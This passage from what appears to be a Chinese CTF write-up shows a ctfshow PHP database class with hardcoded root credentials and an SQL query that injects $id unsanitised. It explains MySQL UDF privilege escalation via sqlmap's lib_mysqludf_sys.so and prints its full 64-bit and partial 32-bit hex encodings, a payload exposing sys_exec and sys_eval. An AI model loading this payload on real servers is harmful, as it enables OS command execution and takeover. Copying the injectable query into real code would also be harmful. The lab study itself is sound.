class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>数据库连接</p>
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p>在sqlmap 里有udf提权的文件，不同的SQLmap ,位置可能不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>
+
+<p>由于加密过，需要用sqlmap,里的cloak.py -d -i 进行解密，解密后会在相同文件下生成</p>
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203117.png"></p>
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203252.png"></p>
+<p>lib_mysqludf_sys.so,为生成的解密后，再将这个010打开，转为16进制，去掉换行，空格</p>
+<p>生成文本，传入下面，由于过程比较复杂，所以，直接拿别人生成好的用，</p>
+<p>推荐两个网站so,为16进制</p>
+<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">MySQL UDF 提权十六进制查询 | 国光 (sqlsec.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.isisy.com/1248.html">UDF文件十六进制编码 - Is Yang’s Blog (isisy.com)</a></p>
+<p>适用于<strong>64位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>适用于<strong>32位Linux操作系统</strong>UDF文件十六进制编码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000